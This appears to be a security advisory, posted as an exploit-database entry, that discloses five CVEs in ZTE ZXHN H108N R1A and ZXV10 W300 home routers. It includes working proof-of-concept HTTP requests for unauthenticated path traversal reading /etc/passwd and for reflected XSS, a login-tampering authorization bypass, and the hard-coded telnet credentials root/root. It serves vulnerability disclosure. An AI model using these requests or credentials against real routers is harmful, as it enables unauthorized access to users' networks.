@@ -1,0 +1,178 @@
+# Exploit Title: [ZTE ZXHN H108N R1A + ZXV10 W300 routers - multiple
+vulnerabilities]
+# Discovered by: Karn Ganeshen
+# CERT VU# 391604
+# Vendor Homepage: [www.zte.com.cn]
+# Versions Reported
+# ZTE ZXHN H108N R1A - Software version ZTE.bhs.ZXHNH108NR1A
+# ZTE ZXV10 W300 - Software version - w300v1.0.0f_ER1_PE
+
+Overview
+ZTE ZXHN H108N R1A router, version ZTE.bhs.ZXHNH108NR1A.h_PE, and ZXV10
+W300 router, version W300V1.0.0f_ER1_PE, contain multiple vulnerabilities.
+*CVE-ID*:
+CVE-2015-7248
+CVE-2015-7249
+CVE-2015-7250
+CVE-2015-7251
+CVE-2015-7252
+
+*Note*: Large deployment size, primarily in Peru, used by TdP.
+
+Description
+*CWE-200* <https://cwe.mitre.org/data/definitions/200.html>*: Information
+Exposure* - CVE-2015-7248
+Multiple information exposure vulnerabilities enable an attacker to obtain
+credentials and other sensitive details about the ZXHN H108N R1A.
+A. User names and password hashes can be viewed in the page source of
+http://<IP>/cgi-bin/webproc
+
+PoC:
+
+Login Page source contents:
+
+...snip....
+//get user info
+var G_UserInfo = new Array();
+var m = 0;
+G_UserInfo[m] = new Array();
+G_UserInfo[m][0] = "admin"; //UserName
+G_UserInfo[m][1] = "$1$Tsnipped/; //Password Hash seen here
+G_UserInfo[m][2] = "1"; //Level
+G_UserInfo[m][3] = "1"; //Index
+m++;
+G_UserInfo[m] = new Array();
+G_UserInfo[m][0] = "user"; //UserName
+G_UserInfo[m][1] = "$1$Tsnipped"; //Password Hash seen here
+G_UserInfo[m][2] = "2"; //Level
+G_UserInfo[m][3] = "2"; //Index
+m++;
+G_UserInfo[m] = new Array();
+G_UserInfo[m][0] = "support"; //UserName
+G_UserInfo[m][1] = "$1$Tsnipped"; //Password Hash seen here
+G_UserInfo[m][2] = "2"; //Level
+G_UserInfo[m][3] = "3"; //Index
+m++;
+...snip...
+
+B. The configuration file of the device contains usernames, passwords,
+keys, and other values in plain text, which can be used by a user with
+lower privileges to gain admin account access. This issue also affects ZTE
+ZXV10 W300 models, version W300V1.0.0f_ER1_PE.
+
+
+*CWE-285* <https://cwe.mitre.org/data/definitions/285.html>*: Improper
+Authorization* - CVE-2015-7249
+
+By default, only admin may authenticate directly with the web
+administration pages in the ZXHN H108N R1A. By manipulating parameters in
+client-side requests, an attacker may authenticate as another existing
+account, such as user or support, and may be able to perform actions
+otherwise not allowed.
+
+PoC 1:
+1. Login page user drop-down option shows only admin only.
+2. Use an intercepting proxy / Tamper Data - and intercept the Login submit
+request.
+3. Change the username admin to user / support and continue Login.
+4. Application permits other users to log in to mgmt portal.
+
+PoC 2:
+After logging in as support, some functional options are visibly
+restricted. Certain actions can still be performed by calling the url
+directly. Application does not perform proper AuthZ checks.
+
+Following poc is a change password link. It is accessible directly, though
+it (correctly) is restricted to changing normal user (non-admin) password
+only.
+
+http://
+<IP>/cgi-bin/webproc?getpage=html/index.html&var:menu=maintenance&var:page=accessctrl&var:subpage=accountpsd
+
+Other functions / pages may also be accessible to non-privileged users.
+
+
+*CWE-22* <http://cwe.mitre.org/data/definitions/22.html>*: Improper
+Limitation of a Pathname to a Restricted Directory ('Path Traversal') *-
+CVE-2015-7250
+
+The webproc cgi module of the ZXHN H108N R1A accepts a getpage parameter
+which takes an unrestricted file path as input, allowing an attacker to
+read arbitrary files on the system.
+
+Arbitrary files can be read off of the device. No authentication is
+required to exploit this vulnerability.
+
+PoC
+
+HTTP POST request
+
+POST /cgi­bin/webproc HTTP/1.1
+Host: IP
+User­Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:18.0) Gecko/20100101
+Firefox/18.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept­Language: en­US,en;q=0.5
+Accept­Encoding: gzip, deflate
+Referer: https://IP/cgi­bin/webproc
+Cookie: sessionid=7ce7bd4a; language=en_us; sys_UserName=admin
+Connection: keep­alive
+Content­Type: application/x­www­form­urlencoded
+Content­Length: 177
+
+getpage=html%2Findex.html&errorpage=%2fetc%2fpasswd&var%3Amenu=setup&var%3Apage=wancfg&obj­
+action=auth&%3Ausername=admin&%3Apassword=admin&%3Aaction=login&%3Asessionid=7ce7bd4a
+
+
+HTTP Response
+
+HTTP/1.0 200 OK
+Content­type: text/html
+Pragma: no­cache
+Cache­Control: no­cache
+set­cookie: sessionid=7ce7bd4a; expires=Fri, 31­Dec­9999 23:59:59
+GMT;path=/
+
+#root:x:0:0:root:/root:/bin/bash
+root:x:0:0:root:/root:/bin/sh
+#tw:x:504:504::/home/tw:/bin/bash
+#tw:x:504:504::/home/tw:/bin/msh
+
+
+*CWE-798* <http://cwe.mitre.org/data/definitions/798.html>*: Use of
+Hard-coded Credentials* - CVE-2015-7251
+
+In the ZXHN H108N R1A, the Telnet service, when enabled, is accessible
+using the hard-coded credentials 'root' for both the username and password.
+
+*CWE-79* <https://cwe.mitre.org/data/definitions/79.html>*: Improper
+Neutralization of Input During Web Page Generation ('Cross-site
+Scripting') *- CVE-2015-7252
+
+In the ZXHN H108N R1A, the errorpage parameter of the webproc cgi module is
+vulnerable to reflected cross-site scripting [pre-authentication].
+
+PoC
+
+POST /cgi­bin/webproc HTTP/1.1
+Host: IP
+User­Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:18.0) Gecko/20100101
+Firefox/18.0 Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept­Language: en­US,en;q=0.5
+Accept­Encoding: gzip, deflate
+Referer: https://IP/cgi­bin/webproc
+Cookie: sessionid=7ce7bd4a; language=en_us; sys_UserName=admin
+Connection: keep­alive
+Content­Type: application/x­www­form­urlencoded
+Content­Length: 177
+
+getpage=html%2Findex.html&*errorpage*=html%2fmain.html<script>alert(1)</script>&var%3Amenu=setup&var%3Apage=wancfg&obj­
+action=auth&%3Ausername=admin&%3Apassword=admin&%3Aaction=login&%3Asessionid=7ce7bd4a
+
+
+
++++++
+-- 
+Best Regards,
+Karn Ganeshen
